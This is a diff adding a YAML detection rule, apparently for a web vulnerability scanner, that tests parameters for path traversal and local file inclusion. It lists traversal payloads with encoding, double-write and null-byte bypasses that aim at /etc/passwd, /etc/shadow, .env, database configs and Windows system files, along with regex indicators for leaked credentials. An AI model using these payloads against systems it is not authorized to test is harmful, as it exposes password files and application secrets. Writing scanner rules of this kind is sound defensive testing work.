@@ -1,0 +1,55 @@
+# Path Traversal / LFI 检测规则
+name: path_traversal
+description: Path Traversal — 目录穿越 / 本地文件包含
+severity: high
+owasp: "A01:2021 — Broken Access Control"
+confidence: 0.9
+enabled: true
+
+endpoint_filter:
+  methods: [GET, POST]
+  param_types: [query, path]
+
+payloads:
+  # Unix/Linux 路径穿越
+  - value: "../../../etc/passwd"
+    description: "经典 Unix 路径穿越"
+  - value: "../../../../etc/passwd"
+    description: "4 级 Unix 路径穿越"
+  - value: "....//....//....//etc/passwd"
+    description: "双写绕过"
+  - value: "..%2F..%2F..%2Fetc%2Fpasswd"
+    description: "URL 编码绕过"
+  - value: "..\\/..\\/..\\/etc/passwd"
+    description: "反斜杠绕过"
+  # Windows 路径穿越
+  - value: "..\\..\\..\\windows\\win.ini"
+    description: "Windows 路径穿越"
+  - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    description: "Windows hosts 文件"
+  # 敏感文件
+  - value: "/etc/shadow"
+    description: "Linux 影子密码文件"
+  - value: "../../.env"
+    description: "环境变量文件"
+  - value: "../../config/database.yml"
+    description: "数据库配置文件"
+  # NULL byte (旧系统)
+  - value: "../../../etc/passwd%00.html"
+    description: "NULL byte 截断欺骗"
+
+exploit_indicator:
+  patterns:
+    - "root:.*:0:0:"
+    - "daemon:.*:1:1:"
+    - "\\[(font|extensions|files|mail)\\]"
+    - "for 16-bit app support"
+    - "DB_PASSWORD"
+    - "DATABASE_URL"
+    - "SECRET_KEY"
+    - "API_KEY"
+    - "password"
+  status_codes: [200, 403]
+
+expected_normal: "文件路径参数不应允许访问应用程序目录之外的文件"
+reasoning_template: "对 {param_name} 参数进行路径穿越测试，尝试读取 {payload_value}"
